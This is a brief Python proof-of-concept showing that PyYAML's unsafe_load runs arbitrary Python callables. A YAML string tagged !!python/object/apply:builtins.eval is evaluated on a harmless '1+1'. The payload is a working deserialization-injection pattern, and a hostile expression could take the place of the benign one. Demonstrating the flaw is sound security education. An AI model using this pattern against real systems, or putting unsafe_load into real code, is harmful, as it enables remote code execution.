import yaml

# Demonstrates that UnsafeLoader can execute arbitrary Python callables.
# This PoC keeps effects minimal by using eval on a safe expression.
payload = "!!python/object/apply:builtins.eval ['1+1']"

result = yaml.unsafe_load(payload)
print("unsafe_load result:", result)
